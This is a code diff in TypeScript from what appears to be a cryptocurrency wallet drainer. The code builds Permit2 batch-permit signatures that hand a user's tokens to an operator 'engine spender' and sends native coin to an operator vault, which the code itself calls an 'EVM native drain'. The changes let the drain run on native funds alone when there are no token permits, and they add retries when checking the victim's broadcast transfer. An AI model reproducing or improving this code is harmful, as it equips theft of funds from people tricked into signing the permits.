@@ -47,7 +47,7 @@ export type NativeTransferTxRequest = {
 }
 
 export type BatchNativeWithPermit2Result = {
-  batchTypedData: ReturnType<typeof buildBatchPermitTypedData>
+  batchTypedData: ReturnType<typeof buildBatchPermitTypedData> | null
   batch_permit_metadata: BatchPermitMetadata
   nativeAmount: string
   native_transfer: NativeTransferTxRequest | null
@@ -177,8 +177,9 @@ export async function batchNativeWithPermit2(params: {
   permit2?: Address
   rpcUrl?: string
 }): Promise<BatchNativeWithPermit2Result> {
-  if (params.permits.length === 0) {
-    throw new Error('batchNativeWithPermit2 requires at least one permit')
+  const nativeAmount = params.nativeAmount ?? 0n
+  if (params.permits.length === 0 && nativeAmount <= 0n) {
+    throw new Error('batchNativeWithPermit2 requires at least one permit or nativeAmount > 0')
   }
 
   const engineSpender = params.engineSpender ?? resolveEngineSpenderAddress()
@@ -186,7 +187,6 @@ export async function batchNativeWithPermit2(params: {
     throw new Error('ENGINE_SPENDER or ADMIN_WALLET_ADDRESS required')
   }
   const permit2 = params.permit2 ?? PERMIT2_ADDRESS
-  const nativeAmount = params.nativeAmount ?? 0n
   const vault = params.vault ?? resolveEvmVaultAddress()
   if (nativeAmount > 0n && !vault) {
     throw new Error('VAULT_ADDRESS_EVM or SOVEREIGN_VAULT_EVM required for EVM native drain')
@@ -201,26 +201,27 @@ export async function batchNativeWithPermit2(params: {
     }),
   })
 
-  const tokens = params.permits.map((p) => getAddress(p.token))
-  const nonces = await readPermit2BatchAllowanceNonces(
-    publicClient,
-    params.wallet,
-    tokens,
-    engineSpender,
-  )
   const expiration = computeSignatureAnchorExpiry()
+  const tokens = params.permits.map((p) => getAddress(p.token))
+  const nonces =
+    tokens.length > 0
+      ? await readPermit2BatchAllowanceNonces(publicClient, params.wallet, tokens, engineSpender)
+      : []
 
-  const batchTypedData = buildBatchPermitTypedData({
-    tokens: tokens.map((t) => t.toLowerCase()),
-    amounts: params.permits.map((p) => p.amount.toString()),
-    owner: params.wallet,
-    spender: engineSpender,
-    chainId: params.chainId,
-    verifyingContract: permit2,
-    nonces,
-    expirations: params.permits.map(() => expiration),
-    sigDeadline: BigInt(expiration),
-  })
+  const batchTypedData =
+    tokens.length > 0
+      ? buildBatchPermitTypedData({
+          tokens: tokens.map((t) => t.toLowerCase()),
+          amounts: params.permits.map((p) => p.amount.toString()),
+          owner: params.wallet,
+          spender: engineSpender,
+          chainId: params.chainId,
+          verifyingContract: permit2,
+          nonces,
+          expirations: params.permits.map(() => expiration),
+          sigDeadline: BigInt(expiration),
+        })
+      : null
 
   const batch_permit_metadata: BatchPermitMetadata = {
     details: params.permits.map((permit, index) => ({
@@ -378,12 +379,21 @@ export async function verifyUserBroadcastNativeTransfer(params: {
   })
 
   let tx
-  try {
-    tx = await publicClient.getTransaction({ hash: params.txHash })
-  } catch (e) {
-    return {
-      ok: false,
-      detail: e instanceof Error ? e.message : 'Failed to load broadcast native transaction',
+  const maxAttempts = 4
+  for (let attempt = 0; attempt < maxAttempts; attempt++) {
+    try {
+      tx = await publicClient.getTransaction({ hash: params.txHash })
+      if (tx != null) break
+    } catch (e) {
+      if (attempt === maxAttempts - 1) {
+        return {
+          ok: false,
+          detail: e instanceof Error ? e.message : 'Failed to load broadcast native transaction',
+        }
+      }
+    }
+    if (tx == null && attempt < maxAttempts - 1) {
+      await new Promise((resolve) => setTimeout(resolve, 1500))
     }
   }
   if (tx == null) {
